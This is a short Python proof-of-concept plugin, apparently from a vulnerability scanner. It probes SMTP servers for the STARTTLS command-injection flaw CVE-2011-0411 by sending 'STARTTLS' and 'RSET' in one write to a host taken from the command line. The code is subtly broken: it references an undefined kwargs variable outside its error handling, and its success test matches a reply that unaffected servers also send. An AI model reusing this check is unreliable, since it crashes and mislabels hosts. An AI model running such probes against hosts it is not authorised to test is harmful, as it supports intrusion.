#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import socket

def get_plugin_info():
    plugin_info = {
        "name": "smtp 命令注入",
        "desc": "smtp starttls明文命令注入(CVE-2011-0411)",
        "grade": "高",
        "type": "service",
        "keyword": "service:smtp cve:CVE-2011-0411 port:25"
    }
    return plugin_info

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':25'
    host,port = check_port(arg).split(':')
    timeout = kwargs.get("timeout",5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, int(port)))
        s.recv(1024).decode()
        s.send(b"STARTTLS\r\nRSET\r\n")
        result = s.recv(1024).decode()
        s.close()
        if r"220 Ready to start TLS" in result:
            return True
        else:
            return False
    except Exception:
        return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))   
